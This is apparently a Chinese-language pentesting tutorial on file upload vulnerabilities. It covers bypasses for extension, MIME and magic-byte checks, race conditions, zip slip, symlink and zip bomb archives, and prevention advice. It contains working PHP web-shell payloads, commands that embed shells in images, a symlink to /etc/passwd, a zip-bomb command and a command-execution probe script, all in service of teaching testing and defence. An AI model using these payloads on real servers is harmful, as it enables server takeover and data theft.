# 文件上传攻击

文件上传漏洞是指 Web 服务器允许用户将文件上传到其文件系统，但没有充分验证其名称、类型、内容或大小等方面。虽然此漏洞的后果高度依赖于允许的文件扩展名类型以及应用程序如何处理上传的文件。未能正确执行对这些方面的限制可能意味着，即使是一个基本的图片上传功能也可能被用来上传任意且潜在危险的文件，甚至可能包括能够实现远程代码执行的服务器端脚本文件。

在某些情况下，上传文件这个行为本身就已经足以造成损害。其他攻击可能涉及对文件的后续 HTTP 请求，通常是为了触发服务器对其执行。

## 影响

文件上传漏洞的影响通常取决于两个关键因素：

- 网站未能正确验证文件的特定方面，是大小、类型、内容还是其他方面。
- 文件成功上传后，对其施加了哪些限制。

在最坏的情况下，文件类型未被正确验证，并且服务器配置允许某些类型的文件（如 `.php` 和 `.jsp`）作为代码执行。在这种情况下，攻击者可能能够上传一个充当 Web Shell 的服务器端代码文件，从而有效地获得对服务器的完全控制。

上传的文件 `shell.php` 将包含以下 PHP 代码。如果前提条件满足，这将使我们能够通过 `cmd` 参数执行系统命令。

**代码**
```php
<?php system($_GET['cmd']); ?>
```

如果文件名未被正确验证，攻击者只需上传一个同名文件即可覆盖关键文件。

此外，即使文件上传被限制为无害扩展名（如文本文件或 JPEG），如果应用程序的其他地方存在文件包含漏洞，它们仍然容易被利用。

如果负责处理文件的底层库存在漏洞，则没有文件格式是完全安全的。例如，过去曾在图像解析器中发现了漏洞，这些漏洞可能允许特制图像执行代码。

未能确保文件大小在预期阈值范围内也可能引发拒绝服务（DoS）攻击，即攻击者填满可用磁盘空间。

## 脆弱因素

使应用程序容易受到文件上传漏洞影响的因素：

- **缺少文件类型检查**：
    应用程序不验证上传的文件是否与允许的安全格式白名单匹配。这意味着任何文件，包括恶意脚本，都可以上传到目标服务器。
    
- **宽松的文件夹权限**：
    上传文件的文件夹允许执行服务器端脚本。

- **可预测的文件名和路径**：
    上传文件的文件名和路径位于可预测的位置。

鉴于其明显的危险性，在实际网站中很少见到对用户允许上传的文件完全没有限制的情况。更常见的是，开发人员实施了他们认为健壮的验证，但这些验证要么本身存在缺陷，要么可以被轻易绕过。

- 试图黑名单化危险的文件类型，但在检查文件扩展名时未能考虑到解析差异。与任何黑名单一样，也很容易意外遗漏一些不太常见但仍然危险的扩展名。

- 试图通过验证容易被攻击者使用拦截代理等工具操纵的属性来检查文件类型。

- 即使是健壮的验证措施也可能在构成网站的多个主机和目录之间不一致地应用，从而导致可被利用的差异。

## Web 服务器对静态文件请求的处理

在我们研究如何利用文件上传漏洞之前，了解服务器如何处理对静态文件的请求是很重要的。

传统上，网站几乎完全由静态文件组成，在请求时提供给用户。因此，每个请求的路径可以与服务器文件系统上的目录和文件层级进行一一映射。如今，网站越来越动态化，请求的路径通常与文件系统完全没有直接关系（RESTful 风格 URL）。尽管如此，Web 服务器仍然处理对某些静态文件的请求，包括样式表、图片等。

处理这些静态文件的过程在很大程度上仍然是相同的。在某个时刻，服务器会解析请求中的路径以识别文件扩展名。然后使用它来确定所请求文件的类型，通常是通过将其与预先配置的扩展名和 MIME 类型之间的映射列表进行比较。接下来发生的情况取决于文件类型和服务器的配置。

- 如果此文件类型是不可执行的，例如图片或静态 HTML 页面，服务器可能只是将文件内容在 HTTP 响应中发送给客户端。
- 如果文件类型是可执行的，例如 PHP 文件，**并且**服务器配置为执行此类文件，它将在运行脚本之前根据 HTTP 请求中的标头和参数分配变量。然后，生成的输出可能会在 HTTP 响应中发送给客户端。
- 如果文件类型是可执行的，但服务器**未**配置为执行此类文件，它通常会响应错误。然而，在某些情况下，文件内容仍可能以纯文本形式发送给客户端。这种配置错误偶尔可以被利用来泄露源代码和其他敏感信息。

> **提示：** `Content-Type` 响应头可能会提供关于服务器认为它提供了什么类型文件的线索。如果此标头未被应用程序代码显式设置，它通常包含文件扩展名/MIME 类型映射的结果。

## 利用无限制文件上传部署 Web Shell

从安全角度来看，最糟糕的情况是网站允许您上传服务器端脚本（如 PHP、Java 或 Python 文件），并且还配置为将它们作为代码执行。这使得在服务器上创建自己的 Web Shell 变得非常简单。

> **Web Shell：** Web Shell 是一种恶意脚本，使攻击者能够通过向正确的端点发送 HTTP 请求，在远程 Web 服务器上执行任意命令。

如果您能够成功上传 Web Shell，您实际上就拥有了对服务器的完全控制。这意味着您可以读写任意文件、泄露敏感数据，甚至使用该服务器对内部基础设施和网络外的其他服务器发起攻击。例如，以下 PHP 单行代码可用于从服务器文件系统读取任意文件：

```php
<?php echo file_get_contents('/path/to/target/file'); ?>
```

一旦上传，对此恶意文件发送请求将在响应中返回目标文件的内容。

一个更通用的 Web Shell 可能看起来像这样：

```php
<?php echo system($_GET['command']); ?>
```

此脚本允许您通过查询参数传递任意系统命令，如下所示：

```http
GET /example/exploit.php?command=id HTTP/1.1
```

## 绕过文件上传限制

多年来，文件上传功能经常成为攻击者的目标。作为回应，开发人员设计了各种防御机制。然而，许多这些防御策略已被绕过，促使进一步演进。以下是一些常见的防御机制及其潜在的绕过方法：

### 绕过客户端验证

开发人员通常使用 JavaScript 进行客户端验证，以将文件上传限制为特定扩展名。然而，这种方法存在一个漏洞：一旦数据离开浏览器，这些客户端防御就变得无效。这种弱点在使用 Web 代理时尤为明显，代理允许用户在将文件传输到服务器之前更改文件扩展名。

为了清晰起见，考虑一个客户端验证检查允许的图像文件扩展名的示例：

**易受攻击的代码**
```javascript
function validateFile() {
    var fileInput = document.getElementById('fileInput');
    var fileName = fileInput.value;
    var fileExtension = fileName.split('.').pop().toLowerCase();
    var allowedExtensions = ['jpg', 'jpeg', 'png', 'gif'];
    if (!allowedExtensions.includes(fileExtension)) {
        alert('Only image files are allowed to be uploaded.');
        return false;
    }
}
```

为了绕过此验证，将执行以下步骤：

1. 将文件扩展名重命名为 `.png`（例如 `mv shell.php shell.png`）。
2. 将文件上传为 `shell.png`。
3. 拦截发出的请求，并将 `.png` 扩展名改回 `.php`。

### 文件类型（MIME）验证绕过

在提交 HTML 表单时，浏览器通常以 `application/x-www-form-urlencoded` 内容类型发送 `POST` 请求。这对于发送简单的文本（如您的姓名或地址）没有问题。然而，它不适合发送大量二进制数据，例如整个图片文件或 PDF 文档。在这种情况下，首选 `multipart/form-data` 内容类型。

考虑一个包含上传图片、提供图片描述和输入用户名字段的表单。提交此类表单可能会产生如下所示的请求：

```http
POST /images HTTP/1.1
Host: normal-website.com
Content-Length: 12345
Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="image"; filename="example.jpg"
Content-Type: image/jpeg

[...binary content of example.jpg...]

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="description"

This is an interesting description of my image.

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="username"

wiener
---------------------------012345678901234567890123456--
```

如您所见，消息正文被分成多个部分，每个表单输入对应一个部分。每个部分包含一个 `Content-Disposition` 头，提供有关其相关输入字段的一些基本信息。这些单独的部分还可能包含它们自己的 `Content-Type` 头，告诉服务器使用此输入提交的数据的 MIME 类型。

网站尝试验证文件上传的一种方式是检查这个特定于输入的 `Content-Type` 头是否与预期的 MIME 类型匹配。例如，如果服务器只期望图片文件，它可能只允许 `image/jpeg` 和 `image/png` 等类型。当开发者使用文件的 MIME 标头的类型值作为验证，而未执行进一步验证来检查文件内容是否实际上与假定的 MIME 类型匹配时，则可以使用 Burp Repeater 等工具轻松绕过此防御。

为了说明这一点，让我们检查以下代码，它仅接受具有 MIME 类型 `image/gif` 或 `image/jpeg` 的文件：

**易受攻击的代码**
```php
<?php
if (isset($_FILES['uploaded_file'])) {
    $target_file = "uploads/" . basename($_FILES['uploaded_file']['name']);
    if ($_FILES['uploaded_file']['type'] != "image/gif" && $_FILES['uploaded_file']['type'] != "image/jpeg") {
        echo "Not allowed! Only Image Files are allowed.";
    }
    if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $target_file)) {
        echo 'File uploaded successfully! ' . $target_file;
    }
}
?>
```

尝试上传 PHP 文件 `Shell.php`。根据服务器配置，内容类型设置为 `application/x-php`：

错误消息指示文件上传需要提供图像文件，由于 MIME 类型不匹配，服务器拒绝了该文件。然而，当将内容类型修改为 `image/jpeg` 时，文件 `shell.php` 被上传，从而绕过了限制。

在渗透测试中，源代码可能并不总是可访问的。在这种情况下，建议进行内容类型模糊测试。为了促进此过程，使用爆破[字典](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)，其中包含可用于模糊测试的已知内容类型值。

### 防止用户可访问目录中的文件执行

作为预防措施，服务器通常只运行已显式配置为可执行的 MIME 类型的脚本。否则，它们可能只是返回某种错误消息，或者在某些情况下，将文件内容以纯文本形式提供：

```http
GET /static/exploit.php?command=id HTTP/1.1
Host: normal-website.com

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 39

<?php echo system($_GET['command']); ?>
```

这种行为本身可能很有趣，因为它可能提供一种泄露源代码的方式，但它会使任何创建 Web Shell 的尝试失效。

这种配置通常因目录而异。用户上传文件所在的目录可能比文件系统上被认为终端用户无法访问的其他位置具有更严格的控制。如果您能找到一种方法将脚本上传到本不应包含用户文件的另一个目录，服务器可能会执行您的脚本（如，路径遍历、压缩文件遍历）。

> **提示：** Web 服务器通常使用 `multipart/form-data` 请求中的 `filename` 字段来确定文件的保存名称和位置。

您还应注意，即使您将所有请求发送到同一域名，这通常也指向某种反向代理服务器（如负载均衡器）。您的请求通常由幕后的其他服务器处理，这些服务器的配置也可能不同。

### 有缺陷的扩展名防御

防止用户上传恶意脚本的较明显方法之一是将潜在危险的文件扩展名（如 `.php`）列入黑名单。黑名单的做法本身存在缺陷，因为很难显式阻止所有可能用于执行代码的文件扩展名。此类黑名单有时可以通过使用鲜为人知的替代文件扩展名来绕过，这些扩展名可能仍然可执行，例如 `.php5`、`.shtml` 等。

#### 使用文件扩展名变体

开发人员通常维护一个不允许上传的扩展名列表。然而，仅依赖这种方法可能导致绕过。鉴于文件扩展名及其潜在变体的数量巨大，总有可能规避这些限制。

为了说明，考虑以下代码，它维护了一个黑名单，包含 `php`、`exe`、`js` 和 `html` 等扩展名。

**易受攻击的代码**
```php
<?php
if (isset($_FILES['uploaded_file'])) {
    $target_file = "uploads/" . basename($_FILES['uploaded_file']['name']);
    $uploadOk = 1;
    $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));
    // 定义不允许的扩展名黑名单
    $blacklist = array("php", "exe", "pdf", "html");
    if (in_array($imageFileType, $blacklist)) {
        echo 'php, exe, js and html files are not allowed! ';
    } else {
        if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $target_file)) {
            echo "The file " . basename($_FILES['uploaded_file']['name']) . " has been uploaded.";
        }
    }
}
?>
```

如果服务器配置为执行 PHP 脚本，我们可以通过使用 `phtml` 扩展名上传 PHP 代码来绕过限制。这是因为在某些配置中，Web 服务器对待 `phtml` 文件的方式与对待 `.php` 文件的方式相同。

以下是绕过文件上传黑名单的其他方法（较不常见的扩展名）。这些方法可能有效，具体取决于所使用的服务器配置和脚本环境：

**按技术分类的绕过扩展名：**

- **PHP**：`.php`, `.php2`, `.php3`, `.php4`, `.php5`, `.php6`, `.php7`, `.phps`, `.pht`, `.phtm`, `.phtml`, `.pgif`, `.shtml`, `.phar`, `.inc`, `.hphp`, `.ctp`, `.module`

- **ASP**：`.asp`, `.aspx`, `.config`, `.ashx`, `.asmx`, `.aspq`, `.axd`, `.cshtm`, `.cshtml`, `.rem`, `.soap`, `.vbhtm`, `.vbhtml`, `.asa`, `.cer`, `.shtml`

- **JSP**：`.jsp`, `.jspx`, `.jsw`, `.jsv`, `.jspf`, `.wss`, `.do`, `.action`

#### 覆盖服务器配置，映射任意扩展名到执行类型

正如我们在上一节中讨论的，服务器通常不会执行文件，除非它们被配置为这样做。例如，在 Apache 服务器执行客户端请求的 PHP 文件之前，开发人员可能必须将以下指令添加到他们的 `/etc/apache2/apache2.conf` 文件中：

```
LoadModule php_module /usr/lib/apache2/modules/libphp.so
AddType application/x-httpd-php .php
```

许多服务器还允许开发人员在各个**目录中**创建特殊配置文件，以**覆盖或添加**一个或多个**全局**设置。例如，Apache 服务器如果存在名为 `.htaccess` 的文件，将从中加载特定于目录的配置。

类似地，开发人员可以在 IIS 服务器上使用 `web.config` 文件进行特定于目录的配置。这可能包括如下指令，在此例中允许将 JSON 文件提供给用户：

```xml
<staticContent>
    <mimeMap fileExtension=".json" mimeType="application/json" />
</staticContent>
```

Web 服务器在存在这些配置文件时会使用它们，但通常不允许您通过 HTTP 请求访问它们。然而，您偶尔可能会发现未能阻止您上传自己的恶意配置文件的服务器。在这种情况下，即使您需要的文件扩展名被列入黑名单，您也可能能够诱骗服务器将任意的自定义文件扩展名映射到可执行的 MIME 类型（即，任意设置扩展名与类型的映射）。

```
AddType application/x-httpd-php .anytype
```

该配置指示服务器将上传的带有 `.anytype` 扩展名的文件解释为 PHP 脚本。因此，一个名为 `x.anytype` 并包含 PHP 代码的文件将被 Web 服务器执行。

#### 混淆文件扩展名，不同组件的解析差异

即使是最详尽的黑名单也可能使用经典的混淆技术被绕过。假设验证代码区分大小写，未能识别 `exploit.pHp` 实际上是一个 `.php` 文件。如果后续将文件扩展名映射到 MIME 类型的代码**不**区分大小写，这种差异允许您将恶意的 PHP 文件偷偷绕过验证，并最终可能被服务器执行。即，核心为不同组件的解析差异

您还可以使用以下技术达到类似结果：

- 提供多个扩展名。根据用于解析文件名的算法，以下文件可能被解释为 PHP 文件或 JPG 图片：`exploit.php.jpg`
- 添加尾随字符。某些组件会去除或忽略尾随空格、点号等：`exploit.php.`
- 尝试对点号、正斜杠和反斜杠进行 URL 编码（或双重 URL 编码）。如果在验证文件扩展名时该值未被解码，但随后在服务器端被解码，这也可以允许您上传本应被阻止的恶意文件：`exploit%2Ephp`
- 在文件扩展名之前添加分号或 URL 编码的空字节字符。如果验证是用 PHP 或 Java 等高级语言编写的，但服务器使用 C/C++ 等低级函数处理文件，这可能导致在什么被视为文件名结尾方面存在差异：`exploit.asp;.jpg` 或 `exploit.asp%00.jpg`
- 尝试使用多字节 unicode 字符，在 unicode 转换或规范化后可能被转换为空字节和点号。如果文件名被解析为 UTF-8 字符串，像 `xC0 x2E`、`xC4 xAE` 或 `xC0 xAE` 这样的序列可能被转换为 `x2E`，但随后在用于路径之前被转换为 ASCII 字符。

其他防御措施涉及剥离或替换危险的扩展名以防止文件被执行。如果此转换未被递归应用，您可以以这样一种方式放置被禁止的字符串：删除它后仍然留下一个有效的文件扩展名。例如，考虑从以下文件名中剥离 `.php` 会发生什么：

```
exploit.p.phphp
```

这只是众多混淆文件扩展名的方法中的一小部分。

### 文件内容验证缺陷，绕过 Magic Bytes

更安全的服务器会尝试验证文件内容是否与实际预期的内容匹配。

在图片上传功能的情况下，服务器可能会尝试验证图片的某些固有属性，例如其尺寸。例如，如果您尝试上传 PHP 脚本，它根本不会有任何尺寸。因此，服务器可以推断它不可能是图片，并相应地拒绝上传。

类似地，某些文件类型可能始终在其头部或尾部包含特定的字节序列（magic bytes）。Magic bytes 是位于文件开头的特定字节序列，用作标识文件格式或内容类型的唯一签名。例如，JPEG 文件始终以字节 `FF D8 FF` 开头。这些可用内容类型验证。

- JPEG
    `FF D8 FF`
- PNG
    `89 50 4E 47 0D 0A 1A 0A`
- GIF
    `47 49 46 38 39 61`

这是一种更健壮的文件类型验证方式，但即使这样也不是万无一失的。使用特殊工具（如 ExifTool），创建一个在元数据中包含恶意代码的混合 JPEG 文件可能很简单。让我们探讨几种将 PHP 代码注入图像的方法。

#### 方法 1：通过 EXIF 数据注入

图像使用 EXIF 格式存储元数据。绕过 magic bytes 保护的一种方法是将恶意 PHP 代码注入 EXIF 数据中。使用 `exiftool`，以下代码将 php 代码注入图片 `fruit.jpg` 的 EXIF 标头的评论字段，并将载荷文件保存为 `payload_img.php`。

**命令**
```bash
exiftool fruit.jpg -o payload_img.php -comment="<?php system($_GET['cmd']); ?>"
```

上传后，服务器检查 magic bytes 的存在。如果找到，服务器将解析嵌入在图像中的 PHP 代码，并执行 `cmd` 参数中指定的命令。php 将忽略 php 标记外的冗余字符。使用某种方式使得服务器将载荷文件作为 php 代码解析，此处示例设置 `.php` 后缀，也可使用之前的覆盖服务器配置等各种方式实现。

#### 方法 2：原始插入

在某些情况下，服务器可能会从上传的文件中删除 EXIF 数据。这可能是出于隐私考虑，因为 EXIF 数据可能包含潜在的敏感信息，如 GPS 坐标。或者，服务器可能未配置为处理 EXIF 数据。在这种情况下，一种可能的解决方案是向图像执行原始插入。以下命令将 PHP 代码插入 PNG 图像：

**命令**
```bash
echo '<?php system($_GET["cmd"]); ?>' >> 1.png
```

### 利用文件上传竞争条件

现代框架对这类攻击有更强的抵御能力。它们通常不会将文件直接上传到文件系统上的预期目标位置。相反，它们会采取预防措施，例如首先上传到临时的沙箱目录并随机化名称以避免覆盖现有文件。然后，它们对此临时文件执行验证，只有在确认安全后才将其传输到目标位置。

尽管如此，开发人员有时会独立于任何框架实现自己的文件上传处理逻辑。这不仅实施起来相当复杂，还可能引入危险的竞争条件，使攻击者能够完全绕过即使是最健壮的验证。

例如，某些网站直接将文件上传到主文件系统，然后在未通过验证时再次将其删除。这种行为在依赖防病毒软件等检查恶意软件的网站中很典型。这可能只需要几毫秒，但在文件存在于服务器上的短暂时间内，攻击者仍然可能执行它。

这些漏洞通常非常微妙，在黑盒测试期间很难检测到，除非您能找到泄露相关源代码的方法。

使用 burp 重复器的“单包攻击”，或扩展 Turbo Intruder 以实现最后一字节同时发送，从而增加竞争条件成功几率

#### 基于 URL 的文件上传中的竞争条件

在允许您通过提供 URL 上传文件的功能中，也可能出现类似的竞争条件。在这种情况下，服务器必须通过网络获取文件并在执行任何验证之前创建本地副本。

由于文件是使用 HTTP 加载的，开发人员无法使用其框架内置的安全验证文件机制。相反，他们可能手动创建自己的临时存储和验证文件的过程，这些过程可能不太安全。

例如，如果文件被加载到具有随机名称的临时目录中，理论上攻击者不可能利用任何竞争条件。如果他们不知道目录名称，他们将无法请求文件以触发其执行。另一方面，如果随机目录名称是使用伪随机函数（如 PHP 的 `uniqid()`）生成的，则可能被暴力破解。

为了使此类攻击更容易，您可以尝试延长处理文件所需的时间，从而延长暴力破解目录名称的时间窗口。一种方法是通过上传更大的文件。如果是分块处理的，您可以通过在开头创建包含载荷的恶意文件，后跟大量任意填充字节来利用这一点。

## 归档文件攻击

### 归档目录遍历

如果应用程序提取归档文件（如 ZIP 文件），则可能通过目录遍历写入非预期位置。这可以通过上传包含遍历文件系统路径（使用诸如 `..\..\..\..\shell.php` 之类的序列）的恶意 ZIP 文件来利用。此技术在 [snyk 公告](https://snyk.io/research/zip-slip-vulnerability)中有进一步讨论。

针对归档目录遍历的测试应包括两部分：

1. 一个恶意的归档文件，在提取时突破目标目录。此恶意归档文件应包含两个文件：一个 `base` 文件，提取到目标目录中；一个 `traversed` 文件，尝试向上遍历目录树以到达根文件夹 - 将文件添加到 `tmp` 目录中。恶意路径将包含多级 `../`（例如 `../../../../../../../../tmp/traversed`），以增加到达根目录的机会。一旦攻击成功，测试人员可以发现在 Web 服务器上通过 ZIP 滑脱攻击创建了 `/tmp/traversed`。

2. 使用自定义代码或库提取压缩文件的逻辑。当提取功能未验证归档中的文件路径时，存在归档目录遍历漏洞。以下示例显示了 Java 中存在漏洞的实现：

```java
Enumeration<ZipEntry> entries =​ ​zip​.g​etEntries();

while(entries​.h​asMoreElements()){
    ZipEntry e ​= ​entries.nextElement();
    File f = new File(destinationDir, e.getName());
    InputStream input = zip​.g​etInputStream(e);
    IOUtils​.c​opy(input, write(f));
}
```

按照以下步骤创建一个 ZIP 文件，一旦上传到 Web 服务器，即可滥用上述存在漏洞的代码：

```bash
# 打开一个新终端并创建树结构
# （根据目标系统，可能需要更多目录级别）
mkdir -p a/b/c
# 创建一个基础文件
echo 'base' > a/b/c/base
# 创建一个遍历文件
echo 'traversed' > traversed
# 您可以在此时使用 `tree` 双重检查树结构
# 导航到 a/b/c 根目录
cd a/b/c
# 压缩文件
zip test.zip base ../../../traversed
# 验证压缩文件内容
unzip -l test.zip
```

### 归档符号链接攻击

如果应用程序提取归档文件（如 ZIP 或 TAR），验证归档中包含的符号链接如何处理非常重要。与归档目录遍历（ZIP 滑脱）不同，此技术不依赖于 `../` 路径遍历序列。

攻击者可以构建一个包含指向服务器上敏感文件（例如 `/etc/passwd`）的符号链接的归档文件。如果提取过程保留符号链接而不进行验证，并且应用程序随后处理或暴露提取的文件，则可能导致对敏感系统文件的非预期访问。

例如，恶意归档文件可能包含：`link.txt -> /etc/passwd`

如果后端在未验证或拒绝符号链接的情况下提取此归档文件，并且应用程序读取 `link.txt`，它可能无意中泄露 `/etc/passwd` 的内容。

### 测试归档目录遍历与符号链接攻击

1. 创建符号链接：`ln -s /etc/passwd link.txt`
2. 创建归档文件：`tar -czf malicious.tar.gz link.txt`
3. 将归档文件上传到应用程序。
4. 检查：
   - 是否提取了符号链接？
   - 应用程序是否跟随该链接？
   - 是否可以访问敏感文件内容？

### ZIP 炸弹

[ZIP 炸弹](https://en.wikipedia.org/wiki/zip_bomb)（更一般地称为解压炸弹）是一种包含大量数据的归档文件。其目的是通过耗尽尝试解压归档文件的目标系统的磁盘空间或内存来造成拒绝服务。请注意，尽管 ZIP 格式是最常用的示例，但其他格式也受到影响，包括 gzip（常用于传输中的数据压缩）。

在最简单的层面上，可以通过压缩一个由单个字符组成的大文件来创建 ZIP 炸弹。以下示例显示如何创建一个 1MB 的文件，解压后将变为 1GB：

```bash
dd if=/dev/zero bs=1M count=1024 | zip -9 > bomb.zip
```

有许多方法可以实现更高的压缩比，包括多级压缩、[滥用 ZIP 格式](https://www.bamsoftware.com/hacks/zipbomb/)和[自产生程序](https://research.swtch.com/zip)（即包含自身副本的归档文件，导致无限递归）。

成功的 ZIP 炸弹攻击将导致拒绝服务，并且如果使用自动扩展云平台，还可能导致成本增加。

## 在没有远程代码执行的情况下利用文件上传漏洞

在我们到目前为止看到的示例中，我们已经能够上传服务器端脚本以实现远程代码执行。这是不安全的文件上传功能最严重的后果，但这些漏洞仍然可以以其他方式利用。

### 上传恶意客户端脚本

虽然您可能无法在服务器上执行脚本，但您仍然可以上传用于客户端攻击的脚本。例如，如果您可以上传 HTML 文件或 SVG 图片，您可以使用 `<script>` 标签创建存储型 XSS 载荷。

如果上传的文件随后出现在其他用户访问的页面上，他们的浏览器在尝试渲染该页面时将执行该脚本。请注意，由于同源策略限制，只有在上传的文件与您上传到的源相同时，这类攻击才会生效。

### 利用上传文件解析中的漏洞

如果上传的文件似乎被安全地存储和提供，最后的办法是尝试利用特定于不同文件格式的解析或处理漏洞。例如，如果您知道服务器解析基于 XML 的文件，如 Microsoft Office `.doc` 或 `.xls` 文件，这可能是 XXE 注入攻击的潜在向量。

XML 文件存在许多潜在漏洞，例如 XML 外部实体（XXE）和拒绝服务攻击，如"十亿笑攻击"。

见 `服务器 - XXE` 主题 

## 使用 PUT 上传文件

值得注意的是，某些 Web 服务器可能被配置为支持 `PUT` 请求。如果没有适当的防御措施，即使 Web 界面没有可用的上传功能，这也可以提供一种上传恶意文件的替代方式。

```
PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php echo file_get_contents('/path/to/file'); ?>
```

> **提示：** 您可以尝试向不同端点发送 `OPTIONS` 请求，以测试是否有任何端点通告支持 `PUT` 方法。

## 其他文件格式

许多其他文件格式也有需要考虑的特定安全问题，例如：

- 资源耗尽
    - 图像文件的最大像素/帧大小

- 代码执行
    - CSV 文件可能允许 [CSV 注入攻击](https://owasp.org/www-community/attacks/CSV_Injection)
    - Office 文件可能包含恶意宏或 PowerShell 代码
    - PDF 可能包含恶意 JavaScript

应仔细审查允许的文件格式是否存在潜在危险功能，并在测试期间尽可能尝试利用这些功能。

## PHP 禁用函数

在渗透测试期间，很常见会遇到某些函数可能导致执行系统命令的场景。这是通过 `php.ini` 文件中的 `disable_functions` 指令实现的，尤其是在共享托管环境中。

虽然管理员通常维护黑名单以限制潜在危险的函数，但值得注意的是，PHP 有一个可用于执行命令的替代函数列表：

**用于执行命令的 PHP 替代函数**

| 名称          | 功能                                                         |
|---------------|--------------------------------------------------------------|
| system        | 执行命令并返回其输出                                         |
| shell_exec    | 执行命令并立即显示输出                                       |
| passthru      | 执行命令并显示原始输出                                       |
| popen         | 执行命令并返回指针                                           |
| exec          | 执行命令并返回输出的最后一行                                 |
| proc_open     | 类似于 popen()                                               |

此过程可以通过创建脚本来自动化，该脚本将遍历这些函数列表，并尝试执行命令 `uname -a`。如果没有任何函数起作用，脚本将返回“All functions were disabled”。

**代码**
```php
<?php
define("CMD", "uname -a");
$list = array(
    "exec",
    "passthru",
    "shell_exec",
    "system",
    "popen",
    "proc_open",
    "eval",
    "assert",
    "pcntl_exec",
    "backticks",
    "expect_popen",
    "expect_expectl"
);
$flag = false;
echo "<h2>Enabled Functions on the Web Server</h2>";
foreach ($list as $func) {
    if (function_exists($func)) {
        $flag = true;
        echo "<b>$func:</b>";;
        echo "<pre>";
        switch ($func) {
            case "popen":
                $hWnd = $func(CMD, 'r');
                $output = fread($hWnd, 4096);
                echo $output;
                pclose($hWnd);
                break;
            case "proc_open":
                $descriptorspec = array(
                    0 => array("pipe", "r"),
                    1 => array("pipe", "w"),
                    2 => array("file", "/tmp/error-output.txt", "a")
                );
                $process = $func(CMD, $descriptorspec, $pipes);
                if (is_resource($process)) {
                    fclose($pipes[0]);
                    echo stream_get_contents($pipes[1]);
                    fclose($pipes[1]);
                    proc_close($process);
                }
                break;
            default:
                echo $func(CMD);
                break;
        }
        echo "</pre>";
        echo "<br/>";
    }
}
if ($flag == false) {
    echo "<b>No functions were enabled to execute commands.</b>";
}
?>
```

经典 ASP 和 ASP.NET 以及 Java 都有执行 shell 命令的机制。然而，PHP 的内置函数在并排比较时可能看起来更多。例如，
- 经典 ASP 主要依赖 `WScript.Shell` 的 `Exec` 方法
- ASP.NET 利用 `Process.Start(processName)`
- 基于 Java 的应用程序通常使用 `Runtime.getRuntime().exec(command)`

## 图像解析库中的漏洞

图像解析器是许多软件栈中负责处理图像数据的核心组件。图像解析器中的漏洞可能使即使安全实现的文件上传功能也变得脆弱。根据漏洞的性质，可能可以制作一个具有标准扩展名（如 JPG、GIF 或 PNG）的图像，用于读取文件甚至执行系统上的代码。

此类漏洞的一个著名例子涉及 ImageMagick。ImageMagick 是一个用于读取、转换和调整各种格式图像的库。ImageMagick 任意文件读取漏洞（CVE-2022-44268）允许攻击者制作恶意图像。当使用 ImageMagick 的应用程序处理此图像时，可能导致目标 Web 服务器上的任意文件泄露。

此漏洞的 POC 已由 GitHub 的用户 “voidz0r” 提供 [https://github.com/voidz0r/CVE-2022-44268]。以下命令生成一个 PNG 图像，当由 ImageMagick 库处理时，将泄露 `/etc/passwd` 的内容：

**命令**
```bash
python3 exploit.py generate -o tmgm.png -r /etc/passwd
```

在恶意图像 `tmgm.png` 被易受攻击的 ImageMagick 库处理之后，`/etc/passwd` 的内容将被嵌入到同一个 `tmgm.png` 文件中。要查看这些内容，应首先将文件下载到本地磁盘。然后可以使用以下命令解析嵌入的数据：

**命令**
```bash
python3 exploit.py parse -i tmgm.png
```

## 具体测试方法

- 研究应用程序的逻辑要求。
- 准备一个包含“未批准”上传文件的库，这些文件可能包括：jsp、exe 或包含脚本的 HTML 文件。
- 在应用程序中导航到文件提交或上传机制。
- 提交“未批准”的文件进行上传，并验证它们是否被正确阻止上传。
- 检查站点是否仅在客户端 JavaScript 中进行文件类型检查。
- 检查站点是否仅通过 HTTP 请求中的“Content-Type”检查文件类型。
- 检查站点是否仅通过文件扩展名检查文件类型。
- 检查其他上传的文件是否可以通过指定 URL 直接访问。
- 检查上传的文件是否可能包含代码或脚本注入。
- 检查是否存在针对上传文件的文件路径检查。特别是，黑客可能会将具有指定路径的文件压缩到 ZIP 中，以便在上传和解压缩后，可以将解压后的文件上传到预期路径。

## 源代码审查

当支持文件上传功能时，以下 API/方法通常在源代码中常见。

- Java：`new file`、`import`、`upload`、`getFileName`、`Download`、`getOutputString`
- C/C++：`open`、`fopen`
- PHP：`move_uploaded_file()`、`Readfile`、`file_put_contents()`、`file()`、`parse_ini_file()`、`copy()`、`fopen()`、`include()`、`require()`

## 如何防止文件上传漏洞

允许用户上传文件很常见，只要您采取正确的预防措施，就不一定是危险的。总的来说，保护您自己的网站免受这些漏洞侵害的最有效方法是实施以下所有实践：

- 对照允许扩展名的白名单（而不是禁止扩展名的黑名单）检查文件扩展名。猜测您可能想要允许哪些扩展名比猜测攻击者可能尝试上传哪些扩展名要容易得多。
- 确保文件名不包含任何可能被解释为目录或遍历序列（`../`）的子字符串。
- 重命名上传的文件以避免可能导致现有文件被覆盖的冲突。
- 在文件被完全验证之前，不要将其上传到服务器的永久文件系统。
- 尽可能使用成熟的框架进行文件上传预处理，而不是尝试编写自己的验证机制。
